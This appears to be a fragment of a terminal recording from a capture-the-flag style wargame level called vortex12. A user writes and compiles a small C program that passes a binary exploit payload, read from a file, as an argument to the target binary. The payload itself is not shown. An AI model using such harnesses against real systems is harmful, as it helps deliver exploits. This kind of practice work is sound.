[7.865, "o", "#include <stdio.h>\r\r\n\u001b[?2004l\r\u001b[?2004h> #include <stdlib.h>\r\r\n\u001b[?2004l\r\u001b[?2004h> #include <unistd.h>\r\r\n\u001b[?2004l\r\u001b[?2004h> /* drv12 - run /vortex/vortex12 with a raw-byte argv[1] read from a file\r\r\n\u001b[?2004l\r\u001b[?2004h>    (the payload contains binary bytes; a shell argument would mangle it) */\r\r\n\u001b[?2004l\r\u001b[?2004h> int main(int argc, char **argv) {\r\r\n\u001b[?2004l\r\u001b[?2004h>     static char buf[16384];\r\r\n\u001b[?2004l\r\u001b[?2004h>     FILE *f = fopen(argv[1], \"r\");\r\r\n\u001b[?2004l\r\u001b[?2004h>     if (!f) return 1;\r\r\n\u001b[?2004l\r\u001b[?2004h>     size_t n = fread(buf, 1, sizeof buf - 1, f);\r\r\n\u001b[?2004l\r\u001b[?2004h>     fclose(f);\r\r\n\u001b[?2004l\r\u001b[?2004h>     buf[n] = 0;\r\r\n\u001b[?2004l\r\u001b[?2004h>     char *av[] = { \"/vortex/vortex12\", buf, 0 };\r\r\n\u001b[?2004l\r\u001b[?2004h>     execv(\"/vortex/vortex12\", av);\r\r\n\u001b[?2004l\r\u001b[?2004h>     return 1;\r\r\n\u001b[?2004l\r\u001b[?2004h> }\r\r\n\u001b[?2004l\r\u001b[?2004h> EOF\r\r\n\u001b[?2004l\r\u001b]3008;start=931ff4ec-9818-4350-95e7-d09cf1f50dae;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=vortex12;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/tmp.u4eWxm9tCN\u001b\\\u001b]3008;end=931ff4ec-9818-4350-95e7-d09cf1f50dae;exit=success\u001b\\\u001b]3008;start=3a908205-1d7a-470a-95f1-4c77bf285783;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=vortex12;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/tmp.u4eWxm9tCN\u001b\\\u001b[?2004h\u001b]0;vortex12@vortex: /tmp/tmp.u4eWxm9tCN\u0007vortex12@vortex:/tmp/tmp.u4eWxm9tCN$ "]
[0.182, "o", "gcc -m32 -o drv12 drv12.c\r\r\n\u001b[?2004l\r"]
